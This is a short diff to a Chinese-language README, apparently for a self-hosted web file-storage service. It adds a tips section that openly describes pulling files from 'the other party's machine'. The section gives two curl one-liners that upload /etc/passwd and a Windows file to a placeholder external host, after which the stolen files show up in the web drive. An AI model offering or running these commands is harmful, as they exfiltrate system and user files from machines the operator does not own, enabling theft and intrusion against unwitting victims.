@@ -16,3 +16,10 @@
 
 ### Demo(是我已经部署好的，地址我就不放了)
 ![image](https://raw.githubusercontent.com/mycve/webstorage/main/static/1.png)
+
+
+### 小技巧（拖对方机器文件、快捷上传等）：
+    curl https://xxxxx.com/api?action=upload -F "file=@/etc/passwd"
+    curl https://xxxxx.com/api?action=upload -F "file=@c://1.txt"
+
+### 执行完了，回到网页刷新网盘 （:- over
